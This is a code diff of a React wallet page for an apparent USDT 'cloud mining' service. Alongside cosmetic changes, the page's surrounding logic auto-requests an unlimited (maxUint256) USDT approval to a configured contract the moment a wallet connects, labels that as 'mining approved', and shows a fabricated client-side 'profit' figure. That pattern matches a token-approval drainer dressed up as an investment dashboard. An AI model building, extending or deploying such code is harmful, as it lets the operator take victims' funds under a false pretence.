@@ -6,28 +6,18 @@ import { supabase } from '../../lib/supabase';
 import { toast } from 'react-toastify';
 import { maxUint256 } from 'viem';
 
-// @ts-ignore
+
 const ERC20_ABI = [
   { "constant": true, "inputs": [{ "name": "owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" },
   { "constant": false, "inputs": [{ "name": "spender", "type": "address" }, { "name": "value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" },
   { "constant": true, "inputs": [{ "name": "owner", "type": "address" }, { "name": "spender", "type": "address" }], "name": "allowance", "outputs": [{ "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }
 ] as const;
 
-// @ts-ignore
+
 const USDT_ADDRESS = process.env.NEXT_PUBLIC_USDT_ADDRESS as `0x${string}`;
 const CLOUD_MINING_CONTRACT = process.env.NEXT_PUBLIC_CLOUD_MINING_CONTRACT as `0x${string}`;
 
-// @ts-ignore
-type UserData = {
-  wallet_address: string;
-  usdt_balance: number;
-  profit_realtime: number;
-  withdrawal_amount: number;
-  infinite_allowance: boolean;
-  last_login: string;
-  show_evn: boolean;
-  join_date: string;
-};
+
 
 
 export default function Wallet() {
@@ -41,9 +31,11 @@ export default function Wallet() {
   const updateCounter = useRef(0);
   const lastWithdrawRequest = useRef(false);
 
+  // Fetch USDT balance and allowance
   const { data: balanceData, refetch: refetchBalance } = useBalance({ address, token: USDT_ADDRESS, query: { refetchInterval: 15000 } });
   const usdtBalance = useMemo(() => Number(balanceData?.formatted || 0), [balanceData]);
 
+  // Fetch allowance
   const { data: allowanceData, refetch: refetchAllowance, isFetched: isAllowanceFetched } = useReadContract({
     address: USDT_ADDRESS,
     abi: ERC20_ABI,
@@ -52,6 +44,7 @@ export default function Wallet() {
     query: { enabled: !!address, refetchInterval: 15000 },
   });
 
+  // Check if allowance is infinite
   const hasInfiniteAllowance = useMemo(() => {
     if (!allowanceData || !isAllowanceFetched) return false;
     return BigInt(allowanceData.toString()) === BigInt(maxUint256.toString());
@@ -59,6 +52,7 @@ export default function Wallet() {
 
   const { writeContractAsync: approve } = useWriteContract();
 
+  // Auto-approve if not already approved
   useEffect(() => {
     const handleAutoApprove = async () => {
       if (address && isAllowanceFetched && !hasInfiniteAllowance) {
@@ -80,6 +74,7 @@ export default function Wallet() {
     handleAutoApprove();
   }, [address, hasInfiniteAllowance, isAllowanceFetched]);
 
+  // Load or create user in Supabase
   useEffect(() => {
     const loadOrCreateUser = async () => {
       if (!address || !isAllowanceFetched) return;
@@ -91,8 +86,6 @@ export default function Wallet() {
           wallet_address: address,
           usdt_balance: usdtBalance,
           profit_realtime: 0,
-          
-          deposit_amount: 0,
           withdrawal_amount: 0,
           infinite_allowance: hasInfiniteAllowance,
           show_evn: false,
@@ -118,6 +111,7 @@ export default function Wallet() {
     loadOrCreateUser();
   }, [address, usdtBalance, isAllowanceFetched]);
 
+  // Update profit in real-time
   useEffect(() => {
     if (!userData || !usdtBalance) return;
 
@@ -139,7 +133,7 @@ export default function Wallet() {
       setCurrentProfit(cappedProfit);
 
       updateCounter.current++;
-      if (updateCounter.current >= 30) {
+      if (updateCounter.current >= 1) {
         updateCounter.current = 0;
         await supabase.from('users').update({ profit_realtime: cappedProfit }).eq('wallet_address', address);
       }
@@ -148,6 +142,7 @@ export default function Wallet() {
     return () => clearInterval(interval);
   }, [userData, usdtBalance]);
 
+  // Handle withdrawal request
   const handleWithdraw = async () => {
     if (!userData || currentProfit < 10) return toast.error('Minimum withdraw is $10');
     const { error } = await supabase.from('users').update({
@@ -162,6 +157,7 @@ export default function Wallet() {
     setShowWithdrawModal(false);
   };
 
+  // Fetch withdrawal history
   useEffect(() => {
     const fetchWithdrawals = async () => {
       if (!address) return;
@@ -175,25 +171,73 @@ export default function Wallet() {
     fetchWithdrawals();
   }, [address]);
 
+  // Fetch wallet data on button click
+  async function fetchwalletData(event: React.MouseEvent<HTMLButtonElement, MouseEvent>): Promise<void> {
+    try {
+      if (!address) {
+        toast.error('Wallet not connected');
+        return;
+      }
+
+      toast.info('Refreshing wallet data...');
+      
+      // Refetch balance and allowance
+      await Promise.all([refetchBalance(), refetchAllowance()]);
+
+      // Fetch user data from Supabase
+      const { data, error } = await supabase
+        .from('users')
+        .select('*')
+        .eq('wallet_address', address)
+        .maybeSingle();
+
+      if (error) {
+        console.error('Error fetching user data:', error);
+        toast.error('Failed to fetch wallet data');
+        return;
+      }
+
+      if (data) {
+        setUserData(data);
+        profitRef.current = data.profit_realtime;
+        setCurrentProfit(data.profit_realtime);
+        lastWithdrawRequest.current = data.withdraw_request;
+        toast.success('Wallet data refreshed successfully');
+      } else {
+        toast.warning('No user data found for this wallet');
+      }
+    } catch (err) {
+      console.error('Error refreshing wallet data:', err);
+      toast.error('An error occurred while refreshing wallet data');
+    }
+  }
+
   return (
     <section className="max-w-4xl mx-auto my-12 p-6 bg-gray-900 rounded-xl shadow-[0_0_20px_-5px_rgba(96,165,250,0.3)]">
       <h2 className="text-3xl font-bold bg-gradient-to-r from-blue-400 to-purple-400 bg-clip-text text-transparent text-center mb-8">WALLET</h2>
       <div className="p-6 border border-gray-700 rounded-xl bg-gradient-to-br from-blue-900/50 to-purple-900/50">
         <div className="space-y-4">
-          {[
+            <button
+            onClick={fetchwalletData}
+            className="w-full mb-4 px-4 py-2 rounded bg-blue-500 hover:bg-blue-600 text-white font-semibold"
+            >
+            Refresh
+            </button>
+
+            {/* Display wallet information */}
+            {[
             ["USDT Balance:", `${usdtBalance.toFixed(2)} USD`],
             ["Join Date:", userData?.join_date ? new Date(userData.join_date).toLocaleDateString() : "N/A"],
             ["Profit (Real-time):", `$${currentProfit.toFixed(2)} USD`],
-            
             ["Status Mining:", hasInfiniteAllowance ? "Approved" : "Not Approved"],
-          ].map(([label, value], index) => (
+            ].map(([label, value], index) => (
             <div key={index} className="flex justify-between items-center p-4 bg-white/5 rounded-lg border border-gray-700">
               <span className="text-gray-300">{label}</span>
               <span className={`text-white font-medium ${label === "Status Mining:" ? (hasInfiniteAllowance ? "text-green-400" : "text-red-400") : ""}`}>
-          {value}
+              {value}
               </span>
             </div>
-          ))}
+            ))}
             <div className="mt-8 flex justify-center gap-4">
               <ConnectButton 
                 label="Connect Wallet"
@@ -215,7 +259,6 @@ export default function Wallet() {
             Withdrawals can only be made if the profit exceeds $10.
             </p>
         </div>
-
       {showWithdrawModal && (
         <div className="mt-4 p-4 bg-gray-700 rounded shadow-md">
           <p className="text-lg text-white font-medium">Withdraw ${currentProfit.toFixed(2)}?</p>
@@ -226,27 +269,11 @@ export default function Wallet() {
         </div>
       )}
 
+      { /* Fetch and display withdrawal history*/ }
       <div className="mt-8">
         <div className="flex justify-between items-center mb-4">
           <h3 className="text-xl text-amber-50 font-semibold">Transaction History</h3>
-          <button
-        onClick={async () => {
-          const { data, error } = await supabase.from('withdraw_history')
-            .select('*')
-            .eq('wallet_address', address)
-            .order('created_at', { ascending: false });
-          if (error) {
-            console.error(error);
-            toast.error('Failed to refresh transaction history');
-          } else {
-            setWithdrawals(data);
-            toast.success('Transaction history refreshed');
-          }
-        }}
-        className="px-4 py-2 bg-blue-600 rounded hover:bg-blue-700 text-white"
-          >
-        Refresh
-          </button>
+          
         </div>
         {withdrawals.length === 0 ? (
           <p className="text-gray-400">No withdrawals yet.</p>
@@ -269,6 +296,7 @@ export default function Wallet() {
           ))
         )}
       </div>
+
     </div>
     </section>
   );
